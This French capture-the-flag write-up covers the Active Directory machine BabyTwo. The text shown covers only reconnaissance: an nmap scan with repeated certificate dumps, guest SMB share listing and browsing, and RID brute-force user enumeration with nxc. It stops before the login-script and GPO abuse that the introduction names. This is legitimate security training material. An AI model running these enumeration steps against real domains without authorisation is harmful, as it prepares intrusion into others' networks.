---
title: BabyTwo
date: 2025-12-27 10:28:41
categories: ["Writeups", "Hackthebox", "Machines"]
tags: ["Medium", "Windows", "Active Directory", "Login script abuse", "GPO Abuse"]
---

**BabyTwo** est une machine Windows de difficulté intermédiaire évoluant dans un environnement **Active Directory**.  L’accès initial est obtenu par **devinette de mots de passe** et par l’**exploitation des scripts de connexion Windows**.  L’élévation de privilèges est réalisée en abusant de **listes de contrôle d’accès (ACL) mal configurées** et de **stratégies de groupe (GPO)**.

# Énumération 
## Nmap

Le scan révèle des ports semblant appartenir à un contrôleur de domaine : DNS (`53`), Kerberos (`88`), LDAP (`389` et `636`), ainsi que d'autres ports Windows : SMB (`445`), RDP (`3389`).
```bash
/workspace/BabyTwo
❯ rustscan -a 10.129.234.72 -- -A -oN fulltcpscan.txt
--snip--
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-12-23 20:53:02Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: baby2.vl0., Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: DNS:dc.baby2.vl, DNS:baby2.vl, DNS:BABY2
| Issuer: commonName=baby2-CA/domainComponent=baby2
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-08-19T14:22:11
| Not valid after:  2105-08-19T14:22:11
| MD5:   4ef7774ca9798d43b332cc537cb641ab
| SHA-1: 6cfd3491aa6c413152e2f61e361fb3325eec47ff
| -----BEGIN CERTIFICATE-----
| MIIFzTCCBLWgAwIBAgITPAAAAAhU+HThTaPQygABAAAACDANBgkqhkiG9w0BAQsF
| ADA+MRIwEAYKCZImiZPyLGQBGRYCdmwxFTATBgoJkiaJk/IsZAEZFgViYWJ5MjER
| MA8GA1UEAxMIYmFieTItQ0EwIBcNMjUwODE5MTQyMjExWhgPMjEwNTA4MTkxNDIy
| MTFaMAAwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDtID+m7KPkEBiQ
| AoNhg+PTMgYGKjCM1nzLEB6DjOuYx6NAqQo5K7q7rwFfuOafbI1Ut9HtpQWGV3wU
| usZj3gLS2Au+3TiEXgyg1mJL/Sitt9dHJ+18TVeUcrkiW3kI58Kxe1JrxqdZTtRQ
| k28JUYw/VaX0Rgqgy7HTqJvDwDeUgTrzLGMAH98LV1pm+Ufnxw8kEKTGzT3lrHPY
| y7fq7xemTHbQ7TtFSZ7TAS5uyus2IPU6oT3pS3z7+u7iohEtaSPGrQksKAY+MWBk
| hO76jGN2VPiRHYCmL0Cy+QbH6Pz+d/K0gnm6BAsTltkcBfSgOozOUzMNLmnhUCi8
| 1KsIkfuJAgMBAAGjggL+MIIC+jA4BgkrBgEEAYI3FQcEKzApBiErBgEEAYI3FQiF
| 4spth//+O4T9nzqEtYddhL3WT4FsASECAW4CAQAwMgYDVR0lBCswKQYIKwYBBQUH
| AwIGCCsGAQUFBwMBBgorBgEEAYI3FAICBgcrBgEFAgMFMA4GA1UdDwEB/wQEAwIF
| oDBABgkrBgEEAYI3FQoEMzAxMAoGCCsGAQUFBwMCMAoGCCsGAQUFBwMBMAwGCisG
| AQQBgjcUAgIwCQYHKwYBBQIDBTAdBgNVHQ4EFgQUCXtEkncgNYDkF718E9YVgVB3
| 9TowHwYDVR0jBBgwFoAU8X4t8lmHLtgllIV37OYMM3rlCggwgcEGA1UdHwSBuTCB
| tjCBs6CBsKCBrYaBqmxkYXA6Ly8vQ049YmFieTItQ0EoMSksQ049ZGMsQ049Q0RQ
| LENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZp
| Z3VyYXRpb24sREM9YmFieTIsREM9dmw/Y2VydGlmaWNhdGVSZXZvY2F0aW9uTGlz
| dD9iYXNlP29iamVjdENsYXNzPWNSTERpc3RyaWJ1dGlvblBvaW50MIG3BggrBgEF
| BQcBAQSBqjCBpzCBpAYIKwYBBQUHMAKGgZdsZGFwOi8vL0NOPWJhYnkyLUNBLENO
| PUFJQSxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1D
| b25maWd1cmF0aW9uLERDPWJhYnkyLERDPXZsP2NBQ2VydGlmaWNhdGU/YmFzZT9v
| YmplY3RDbGFzcz1jZXJ0aWZpY2F0aW9uQXV0aG9yaXR5MCoGA1UdEQEB/wQgMB6C
| C2RjLmJhYnkyLnZsgghiYWJ5Mi52bIIFQkFCWTIwTgYJKwYBBAGCNxkCBEEwP6A9
| BgorBgEEAYI3GQIBoC8ELVMtMS01LTIxLTIxMzI0Mzk1OC0xNzY2MjU5NjIwLTQy
| NzY5NzYyNjctMTAwMDANBgkqhkiG9w0BAQsFAAOCAQEAZcjNnVAZdPRyGGRqc+Ik
| G6uvFUfS2h+UL8gPUvubcxFvKOsLH1l8zA/3/ouaB0mCqNsccE7kAeZ0VeSj3k+z
| +oOLyPhRhyJgh8ZO26X2iaJPInGooTAP7GekWOet4yeFrzmLJ4y4Hs/nZh1kYED+
| KxY5gr4mkn9BxDGqi9E+C82bY+wT9YlonabfwQsXfIsoLs2edKLFmL9YPxA5AYkG
| UDr5+/D1sTb/ZJJ5Vuv/bqPqA+d4KxLfadbbeRoQtqQCbmZAnvdm8yezF4UU+t0J
| 21lG42LN+VtpTRdVFGbEq5iY448J+cHTYfK8euA6L4w9IqAdkDL1SjHO3hiWwgtb
| Fg==
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: baby2.vl0., Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: DNS:dc.baby2.vl, DNS:baby2.vl, DNS:BABY2
| Issuer: commonName=baby2-CA/domainComponent=baby2
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-08-19T14:22:11
| Not valid after:  2105-08-19T14:22:11
| MD5:   4ef7774ca9798d43b332cc537cb641ab
| SHA-1: 6cfd3491aa6c413152e2f61e361fb3325eec47ff
| -----BEGIN CERTIFICATE-----
| MIIFzTCCBLWgAwIBAgITPAAAAAhU+HThTaPQygABAAAACDANBgkqhkiG9w0BAQsF
| ADA+MRIwEAYKCZImiZPyLGQBGRYCdmwxFTATBgoJkiaJk/IsZAEZFgViYWJ5MjER
| MA8GA1UEAxMIYmFieTItQ0EwIBcNMjUwODE5MTQyMjExWhgPMjEwNTA4MTkxNDIy
| MTFaMAAwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDtID+m7KPkEBiQ
| AoNhg+PTMgYGKjCM1nzLEB6DjOuYx6NAqQo5K7q7rwFfuOafbI1Ut9HtpQWGV3wU
| usZj3gLS2Au+3TiEXgyg1mJL/Sitt9dHJ+18TVeUcrkiW3kI58Kxe1JrxqdZTtRQ
| k28JUYw/VaX0Rgqgy7HTqJvDwDeUgTrzLGMAH98LV1pm+Ufnxw8kEKTGzT3lrHPY
| y7fq7xemTHbQ7TtFSZ7TAS5uyus2IPU6oT3pS3z7+u7iohEtaSPGrQksKAY+MWBk
| hO76jGN2VPiRHYCmL0Cy+QbH6Pz+d/K0gnm6BAsTltkcBfSgOozOUzMNLmnhUCi8
| 1KsIkfuJAgMBAAGjggL+MIIC+jA4BgkrBgEEAYI3FQcEKzApBiErBgEEAYI3FQiF
| 4spth//+O4T9nzqEtYddhL3WT4FsASECAW4CAQAwMgYDVR0lBCswKQYIKwYBBQUH
| AwIGCCsGAQUFBwMBBgorBgEEAYI3FAICBgcrBgEFAgMFMA4GA1UdDwEB/wQEAwIF
| oDBABgkrBgEEAYI3FQoEMzAxMAoGCCsGAQUFBwMCMAoGCCsGAQUFBwMBMAwGCisG
| AQQBgjcUAgIwCQYHKwYBBQIDBTAdBgNVHQ4EFgQUCXtEkncgNYDkF718E9YVgVB3
| 9TowHwYDVR0jBBgwFoAU8X4t8lmHLtgllIV37OYMM3rlCggwgcEGA1UdHwSBuTCB
| tjCBs6CBsKCBrYaBqmxkYXA6Ly8vQ049YmFieTItQ0EoMSksQ049ZGMsQ049Q0RQ
| LENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZp
| Z3VyYXRpb24sREM9YmFieTIsREM9dmw/Y2VydGlmaWNhdGVSZXZvY2F0aW9uTGlz
| dD9iYXNlP29iamVjdENsYXNzPWNSTERpc3RyaWJ1dGlvblBvaW50MIG3BggrBgEF
| BQcBAQSBqjCBpzCBpAYIKwYBBQUHMAKGgZdsZGFwOi8vL0NOPWJhYnkyLUNBLENO
| PUFJQSxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1D
| b25maWd1cmF0aW9uLERDPWJhYnkyLERDPXZsP2NBQ2VydGlmaWNhdGU/YmFzZT9v
| YmplY3RDbGFzcz1jZXJ0aWZpY2F0aW9uQXV0aG9yaXR5MCoGA1UdEQEB/wQgMB6C
| C2RjLmJhYnkyLnZsgghiYWJ5Mi52bIIFQkFCWTIwTgYJKwYBBAGCNxkCBEEwP6A9
| BgorBgEEAYI3GQIBoC8ELVMtMS01LTIxLTIxMzI0Mzk1OC0xNzY2MjU5NjIwLTQy
| NzY5NzYyNjctMTAwMDANBgkqhkiG9w0BAQsFAAOCAQEAZcjNnVAZdPRyGGRqc+Ik
| G6uvFUfS2h+UL8gPUvubcxFvKOsLH1l8zA/3/ouaB0mCqNsccE7kAeZ0VeSj3k+z
| +oOLyPhRhyJgh8ZO26X2iaJPInGooTAP7GekWOet4yeFrzmLJ4y4Hs/nZh1kYED+
| KxY5gr4mkn9BxDGqi9E+C82bY+wT9YlonabfwQsXfIsoLs2edKLFmL9YPxA5AYkG
| UDr5+/D1sTb/ZJJ5Vuv/bqPqA+d4KxLfadbbeRoQtqQCbmZAnvdm8yezF4UU+t0J
| 21lG42LN+VtpTRdVFGbEq5iY448J+cHTYfK8euA6L4w9IqAdkDL1SjHO3hiWwgtb
| Fg==
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: baby2.vl0., Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: DNS:dc.baby2.vl, DNS:baby2.vl, DNS:BABY2
| Issuer: commonName=baby2-CA/domainComponent=baby2
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-08-19T14:22:11
| Not valid after:  2105-08-19T14:22:11
| MD5:   4ef7774ca9798d43b332cc537cb641ab
| SHA-1: 6cfd3491aa6c413152e2f61e361fb3325eec47ff
| -----BEGIN CERTIFICATE-----
| MIIFzTCCBLWgAwIBAgITPAAAAAhU+HThTaPQygABAAAACDANBgkqhkiG9w0BAQsF
| ADA+MRIwEAYKCZImiZPyLGQBGRYCdmwxFTATBgoJkiaJk/IsZAEZFgViYWJ5MjER
| MA8GA1UEAxMIYmFieTItQ0EwIBcNMjUwODE5MTQyMjExWhgPMjEwNTA4MTkxNDIy
| MTFaMAAwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDtID+m7KPkEBiQ
| AoNhg+PTMgYGKjCM1nzLEB6DjOuYx6NAqQo5K7q7rwFfuOafbI1Ut9HtpQWGV3wU
| usZj3gLS2Au+3TiEXgyg1mJL/Sitt9dHJ+18TVeUcrkiW3kI58Kxe1JrxqdZTtRQ
| k28JUYw/VaX0Rgqgy7HTqJvDwDeUgTrzLGMAH98LV1pm+Ufnxw8kEKTGzT3lrHPY
| y7fq7xemTHbQ7TtFSZ7TAS5uyus2IPU6oT3pS3z7+u7iohEtaSPGrQksKAY+MWBk
| hO76jGN2VPiRHYCmL0Cy+QbH6Pz+d/K0gnm6BAsTltkcBfSgOozOUzMNLmnhUCi8
| 1KsIkfuJAgMBAAGjggL+MIIC+jA4BgkrBgEEAYI3FQcEKzApBiErBgEEAYI3FQiF
| 4spth//+O4T9nzqEtYddhL3WT4FsASECAW4CAQAwMgYDVR0lBCswKQYIKwYBBQUH
| AwIGCCsGAQUFBwMBBgorBgEEAYI3FAICBgcrBgEFAgMFMA4GA1UdDwEB/wQEAwIF
| oDBABgkrBgEEAYI3FQoEMzAxMAoGCCsGAQUFBwMCMAoGCCsGAQUFBwMBMAwGCisG
| AQQBgjcUAgIwCQYHKwYBBQIDBTAdBgNVHQ4EFgQUCXtEkncgNYDkF718E9YVgVB3
| 9TowHwYDVR0jBBgwFoAU8X4t8lmHLtgllIV37OYMM3rlCggwgcEGA1UdHwSBuTCB
| tjCBs6CBsKCBrYaBqmxkYXA6Ly8vQ049YmFieTItQ0EoMSksQ049ZGMsQ049Q0RQ
| LENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZp
| Z3VyYXRpb24sREM9YmFieTIsREM9dmw/Y2VydGlmaWNhdGVSZXZvY2F0aW9uTGlz
| dD9iYXNlP29iamVjdENsYXNzPWNSTERpc3RyaWJ1dGlvblBvaW50MIG3BggrBgEF
| BQcBAQSBqjCBpzCBpAYIKwYBBQUHMAKGgZdsZGFwOi8vL0NOPWJhYnkyLUNBLENO
| PUFJQSxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1D
| b25maWd1cmF0aW9uLERDPWJhYnkyLERDPXZsP2NBQ2VydGlmaWNhdGU/YmFzZT9v
| YmplY3RDbGFzcz1jZXJ0aWZpY2F0aW9uQXV0aG9yaXR5MCoGA1UdEQEB/wQgMB6C
| C2RjLmJhYnkyLnZsgghiYWJ5Mi52bIIFQkFCWTIwTgYJKwYBBAGCNxkCBEEwP6A9
| BgorBgEEAYI3GQIBoC8ELVMtMS01LTIxLTIxMzI0Mzk1OC0xNzY2MjU5NjIwLTQy
| NzY5NzYyNjctMTAwMDANBgkqhkiG9w0BAQsFAAOCAQEAZcjNnVAZdPRyGGRqc+Ik
| G6uvFUfS2h+UL8gPUvubcxFvKOsLH1l8zA/3/ouaB0mCqNsccE7kAeZ0VeSj3k+z
| +oOLyPhRhyJgh8ZO26X2iaJPInGooTAP7GekWOet4yeFrzmLJ4y4Hs/nZh1kYED+
| KxY5gr4mkn9BxDGqi9E+C82bY+wT9YlonabfwQsXfIsoLs2edKLFmL9YPxA5AYkG
| UDr5+/D1sTb/ZJJ5Vuv/bqPqA+d4KxLfadbbeRoQtqQCbmZAnvdm8yezF4UU+t0J
| 21lG42LN+VtpTRdVFGbEq5iY448J+cHTYfK8euA6L4w9IqAdkDL1SjHO3hiWwgtb
| Fg==
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
3269/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: baby2.vl0., Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: DNS:dc.baby2.vl, DNS:baby2.vl, DNS:BABY2
| Issuer: commonName=baby2-CA/domainComponent=baby2
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-08-19T14:22:11
| Not valid after:  2105-08-19T14:22:11
| MD5:   4ef7774ca9798d43b332cc537cb641ab
| SHA-1: 6cfd3491aa6c413152e2f61e361fb3325eec47ff
| -----BEGIN CERTIFICATE-----
| MIIFzTCCBLWgAwIBAgITPAAAAAhU+HThTaPQygABAAAACDANBgkqhkiG9w0BAQsF
| ADA+MRIwEAYKCZImiZPyLGQBGRYCdmwxFTATBgoJkiaJk/IsZAEZFgViYWJ5MjER
| MA8GA1UEAxMIYmFieTItQ0EwIBcNMjUwODE5MTQyMjExWhgPMjEwNTA4MTkxNDIy
| MTFaMAAwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDtID+m7KPkEBiQ
| AoNhg+PTMgYGKjCM1nzLEB6DjOuYx6NAqQo5K7q7rwFfuOafbI1Ut9HtpQWGV3wU
| usZj3gLS2Au+3TiEXgyg1mJL/Sitt9dHJ+18TVeUcrkiW3kI58Kxe1JrxqdZTtRQ
| k28JUYw/VaX0Rgqgy7HTqJvDwDeUgTrzLGMAH98LV1pm+Ufnxw8kEKTGzT3lrHPY
| y7fq7xemTHbQ7TtFSZ7TAS5uyus2IPU6oT3pS3z7+u7iohEtaSPGrQksKAY+MWBk
| hO76jGN2VPiRHYCmL0Cy+QbH6Pz+d/K0gnm6BAsTltkcBfSgOozOUzMNLmnhUCi8
| 1KsIkfuJAgMBAAGjggL+MIIC+jA4BgkrBgEEAYI3FQcEKzApBiErBgEEAYI3FQiF
| 4spth//+O4T9nzqEtYddhL3WT4FsASECAW4CAQAwMgYDVR0lBCswKQYIKwYBBQUH
| AwIGCCsGAQUFBwMBBgorBgEEAYI3FAICBgcrBgEFAgMFMA4GA1UdDwEB/wQEAwIF
| oDBABgkrBgEEAYI3FQoEMzAxMAoGCCsGAQUFBwMCMAoGCCsGAQUFBwMBMAwGCisG
| AQQBgjcUAgIwCQYHKwYBBQIDBTAdBgNVHQ4EFgQUCXtEkncgNYDkF718E9YVgVB3
| 9TowHwYDVR0jBBgwFoAU8X4t8lmHLtgllIV37OYMM3rlCggwgcEGA1UdHwSBuTCB
| tjCBs6CBsKCBrYaBqmxkYXA6Ly8vQ049YmFieTItQ0EoMSksQ049ZGMsQ049Q0RQ
| LENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZp
| Z3VyYXRpb24sREM9YmFieTIsREM9dmw/Y2VydGlmaWNhdGVSZXZvY2F0aW9uTGlz
| dD9iYXNlP29iamVjdENsYXNzPWNSTERpc3RyaWJ1dGlvblBvaW50MIG3BggrBgEF
| BQcBAQSBqjCBpzCBpAYIKwYBBQUHMAKGgZdsZGFwOi8vL0NOPWJhYnkyLUNBLENO
| PUFJQSxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1D
| b25maWd1cmF0aW9uLERDPWJhYnkyLERDPXZsP2NBQ2VydGlmaWNhdGU/YmFzZT9v
| YmplY3RDbGFzcz1jZXJ0aWZpY2F0aW9uQXV0aG9yaXR5MCoGA1UdEQEB/wQgMB6C
| C2RjLmJhYnkyLnZsgghiYWJ5Mi52bIIFQkFCWTIwTgYJKwYBBAGCNxkCBEEwP6A9
| BgorBgEEAYI3GQIBoC8ELVMtMS01LTIxLTIxMzI0Mzk1OC0xNzY2MjU5NjIwLTQy
| NzY5NzYyNjctMTAwMDANBgkqhkiG9w0BAQsFAAOCAQEAZcjNnVAZdPRyGGRqc+Ik
| G6uvFUfS2h+UL8gPUvubcxFvKOsLH1l8zA/3/ouaB0mCqNsccE7kAeZ0VeSj3k+z
| +oOLyPhRhyJgh8ZO26X2iaJPInGooTAP7GekWOet4yeFrzmLJ4y4Hs/nZh1kYED+
| KxY5gr4mkn9BxDGqi9E+C82bY+wT9YlonabfwQsXfIsoLs2edKLFmL9YPxA5AYkG
| UDr5+/D1sTb/ZJJ5Vuv/bqPqA+d4KxLfadbbeRoQtqQCbmZAnvdm8yezF4UU+t0J
| 21lG42LN+VtpTRdVFGbEq5iY448J+cHTYfK8euA6L4w9IqAdkDL1SjHO3hiWwgtb
| Fg==
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
3389/tcp  open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
|_ssl-date: 2025-12-23T20:54:36+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=dc.baby2.vl
| Issuer: commonName=dc.baby2.vl
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-08-18T14:29:57
| Not valid after:  2026-02-17T14:29:57
| MD5:   ae82599cb589a1ec60b7e83c50d7cf06
| SHA-1: 1e8a1ac992a1c502dd3a8d88534112a0828dbbcb
| -----BEGIN CERTIFICATE-----
| MIIC2jCCAcKgAwIBAgIQECzNJMCvB7JBsQI1BY17HDANBgkqhkiG9w0BAQsFADAW
| MRQwEgYDVQQDEwtkYy5iYWJ5Mi52bDAeFw0yNTA4MTgxNDI5NTdaFw0yNjAyMTcx
| NDI5NTdaMBYxFDASBgNVBAMTC2RjLmJhYnkyLnZsMIIBIjANBgkqhkiG9w0BAQEF
| AAOCAQ8AMIIBCgKCAQEAtcTzjo+8B5V4o+bT9kNHk7efkEVO+xKeKD8WBVD4iVm2
| DSdZ9MzkdttJEXUSx1q39pcX6FssOvKjZon5I1sObA+tilALHlDv/QzUmOTmHS0U
| eAbUTL5ICrNGS4IkgUyFr6tmsp72rJFXyhuF90pcYFdvW5YVHoA/pwf3P2Umlg/0
| 4CwVa7f8xrJc6dvqGW85GVkGd/2rsqvLX5sPmvq3SYonP+FqTpog9TG22g/W9E8l
| ReG+MExHMW3MVeCD9MwazG/wp//i5nGNkZnjHzYjThOdyI89e9r9RHBuqu1pTogv
| SSkCFUOj18YJMOLKYXhwRJ89yTwrvARETmSnCq7ExQIDAQABoyQwIjATBgNVHSUE
| DDAKBggrBgEFBQcDATALBgNVHQ8EBAMCBDAwDQYJKoZIhvcNAQELBQADggEBACyC
| mmndouOsKsD5ymW6HW9oZ+g7B9/UzSSKTOB+xTZtftedR4sFFD+7B5P76WhppX9p
| CzGBiAnRcy+W6Wg/vzhSg7IW6tF8Tp0AJkL6Fxks9K2AgDBeCk1EizovGSchjEyv
| iLzzAFtHAUVqy7yix1SIyeNwPUNhuRbxg+9AOCQDOOwVYyit8sRz/saDlRqU9xpl
| 0KGQ846kXP9NjxstyU/ry+c0TJP98XyXjnM+v/Xy873VofxHBGXQdW9MAakY0HbX
| p3PvvrCMr8MTGGhZVJ2KsZCruIuU6XZ3Yv7Dnqc6Dp+7q1Tp64FriRgr/UP0y2Mk
| FVYhV7IDnNZyaBQW91k=
|_-----END CERTIFICATE-----
| rdp-ntlm-info:
|   Target_Name: BABY2
|   NetBIOS_Domain_Name: BABY2
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: baby2.vl
|   DNS_Computer_Name: dc.baby2.vl
|   DNS_Tree_Name: baby2.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2025-12-23T20:53:56+00:00
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
56123/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
56124/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
56140/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
57691/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
57727/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
```

Ensuite j'ajoute le nom de domaine ainsi que le *FQDN* dans le fichier **/etc/hosts**.
```bash
/workspace/BabyTwo
❯ nxc smb 10.129.234.72 --generate-hosts-file /etc/hosts
SMB         10.129.234.72   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:baby2.vl) (signing:True) (SMBv1:None) (Null Auth:True)

/workspace/BabyTwo
❯ cat /etc/hosts
127.0.0.1       localhost
::1     localhost ip6-localhost ip6-loopback
fe00::  ip6-localnet
ff00::  ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
172.17.0.2      exegol-htb-labs
10.129.234.72     DC.baby2.vl baby2.vl DC
```

## SMB - TCP 445
### Énumération de partages

Je n'ai pas la permission de lister les partages en tant qu'anonyme.
```bash
/workspace/BabyTwo
❯ nxc smb dc.baby2.vl -u '' -p '' --shares
SMB         10.129.234.72   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:baby2.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.234.72   445    DC               [+] baby2.vl\:
SMB         10.129.234.72   445    DC               [-] Error enumerating shares: STATUS_ACCESS_DENIED
```

En tant que l'utilisateur **Guest**, j'ai un accès en lecture aux partages `NETLOGON`, `IPC$`, `apps`. Puis un accès en lecture et en écriture sur le partage `homes`.
```bash
/workspace/BabyTwo
❯ nxc smb dc.baby2.vl -u 'guest' -p '' --shares
SMB         10.129.234.72   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:baby2.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.234.72   445    DC               [+] baby2.vl\guest:
SMB         10.129.234.72   445    DC               [*] Enumerated shares
SMB         10.129.234.72   445    DC               Share           Permissions     Remark
SMB         10.129.234.72   445    DC               -----           -----------     ------
SMB         10.129.234.72   445    DC               ADMIN$                          Remote Admin
SMB         10.129.234.72   445    DC               apps            READ
SMB         10.129.234.72   445    DC               C$                              Default share
SMB         10.129.234.72   445    DC               docs
SMB         10.129.234.72   445    DC               homes           READ,WRITE
SMB         10.129.234.72   445    DC               IPC$            READ            Remote IPC
SMB         10.129.234.72   445    DC               NETLOGON        READ            Logon server share
SMB         10.129.234.72   445    DC               SYSVOL                          Logon server share
```

Dans le partage `homes`, se trouvent les repertoires personnels de quelques utilisateurs du domaine.
```bash
/workspace/BabyTwo
❯ smbclientng -H dc.baby2.vl -d baby2.vl -u guest -p ''
               _          _ _            _
 ___ _ __ ___ | |__   ___| (_) ___ _ __ | |_      _ __   __ _
/ __| '_ ` _ \| '_ \ / __| | |/ _ \ '_ \| __|____| '_ \ / _` |
\__ \ | | | | | |_) | (__| | |  __/ | | | ||_____| | | | (_| |
|___/_| |_| |_|_.__/ \___|_|_|\___|_| |_|\__|    |_| |_|\__, |
    by @podalirius_                             v3.0.0  |___/

  | Provide a password for 'baby2.vl\guest':
[+] Successfully authenticated to 'dc.baby2.vl' as 'baby2.vl\guest'!
■[\\dc.baby2.vl\]> use homes
■[\\dc.baby2.vl\homes\]> ls
d-------     0.00 B  2025-12-23 22:00  .\
d-------     0.00 B  2023-08-22 22:10  ..\
d-------     0.00 B  2023-08-22 22:17  Amelia.Griffiths\
d-------     0.00 B  2023-08-22 22:17  Carl.Moore\
d-------     0.00 B  2023-08-22 22:17  Harry.Shaw\
d-------     0.00 B  2023-08-22 22:17  Joan.Jennings\
d-------     0.00 B  2023-08-22 22:17  Joel.Hurst\
d-------     0.00 B  2023-08-22 22:17  Kieran.Mitchell\
d-------     0.00 B  2023-08-22 22:22  library\
d-------     0.00 B  2023-08-22 22:17  Lynda.Bailey\
d-------     0.00 B  2023-08-22 22:17  Mohammed.Harris\
d-------     0.00 B  2023-08-22 22:17  Nicola.Lamb\
d-------     0.00 B  2023-08-22 22:17  Ryan.Jenkins\
```

Dans le partage `apps`, se trouve un répertoire `dev` contenant un raccourci vers un script de connexion.
```bash
■[\\dc.baby2.vl\homes\]> use apps
■[\\dc.baby2.vl\apps\]> ls
d-------     0.00 B  2023-09-07 21:12  .\
d-------     0.00 B  2023-08-22 22:10  ..\
d-------     0.00 B  2023-09-07 21:13  dev\
■[\\dc.baby2.vl\apps\]> cd dev
■[\\dc.baby2.vl\apps\dev\]> ls
d-------     0.00 B  2023-09-07 21:13  .\
d-------     0.00 B  2023-09-07 21:12  ..\
-a------   108.00 B  2023-09-07 21:16  CHANGELOG
-a------    1.76 kB  2023-09-07 21:13  login.vbs.lnk
```

### RID Brute

Ensuite j'énumère les utilisateurs du domaine avec l'option `--rid-brute`.
```bash
/workspace/BabyTwo
❯ nxc smb dc.baby2.vl -u 'guest' -p '' --rid-brute
SMB         10.129.234.72   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:baby2.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.234.72   445    DC               [+] baby2.vl\guest:
SMB         10.129.234.72   445    DC               498: BABY2\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.234.72   445    DC               500: BABY2\Administrator (SidTypeUser)
SMB         10.129.234.72   445    DC               501: BABY2\Guest (SidTypeUser)
SMB         10.129.234.72   445    DC               502: BABY2\krbtgt (SidTypeUser)
SMB         10.129.234.72   445    DC               512: BABY2\Domain Admins (SidTypeGroup)
SMB         10.129.234.72   445    DC               513: BABY2\Domain Users (SidTypeGroup)
SMB         10.129.234.72   445    DC               514: BABY2\Domain Guests (SidTypeGroup)
SMB         10.129.234.72   445    DC               515: BABY2\Domain Computers (SidTypeGroup)
SMB         10.129.234.72   445    DC               516: BABY2\Domain Controllers (SidTypeGroup)
SMB         10.129.234.72   445    DC               517: BABY2\Cert Publishers (SidTypeAlias)
SMB         10.129.234.72   445    DC               518: BABY2\Schema Admins (SidTypeGroup)
SMB         10.129.234.72   445    DC               519: BABY2\Enterprise Admins (SidTypeGroup)
SMB         10.129.234.72   445    DC               520: BABY2\Group Policy Creator Owners (SidTypeGroup)
SMB         10.129.234.72   445    DC               521: BABY2\Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.234.72   445    DC               522: BABY2\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.129.234.72   445    DC               525: BABY2\Protected Users (SidTypeGroup)
